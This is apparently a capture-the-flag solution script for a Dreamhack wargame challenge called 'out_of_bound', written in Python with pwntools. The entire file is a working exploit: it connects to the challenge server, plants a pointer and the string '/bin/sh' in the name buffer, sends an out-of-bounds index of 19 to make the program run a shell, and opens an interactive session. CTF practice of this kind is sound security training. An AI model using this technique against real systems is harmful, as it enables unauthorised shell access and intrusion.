#!/usr/bin/env python3
from pwn import *
exe = ELF('out_of_bound', checksec = False)

# p = process(exe.path)
p = remote('host3.dreamhack.games', 10301)

input()
name_addr = 0x804a0ac
payload = p32(name_addr + 4)
payload += b'/bin/sh'
p.sendlineafter(b'name: ', payload)
p.sendlineafter(b'want?: ', b'19')


p.interactive()